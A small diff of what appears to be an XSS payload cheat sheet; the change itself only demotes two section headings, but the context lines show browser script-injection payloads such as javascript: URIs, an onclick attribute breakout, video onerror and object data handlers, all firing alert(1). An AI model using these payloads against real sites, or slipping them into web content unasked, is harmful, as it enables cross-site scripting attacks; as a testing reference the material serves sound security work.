@@ -35,7 +35,7 @@ Try:
 `javascript:alert(1);`
 `#"onclick="javascript:alert(1)`
 
-## Event Handlers
+### Event Handlers
 
 ```
 <video src=1 onerror=alert(1)>
@@ -66,7 +66,7 @@ Use `autofocus` attribute to automatically trigger events that previously requir
 Event handlers in closing tags:
 `</a onmousemove=alert(1)>`
 
-## Script Pseudo-Protocols
+### Script Pseudo-Protocols
 
 ```
 <object data=javascript:alert(1)>
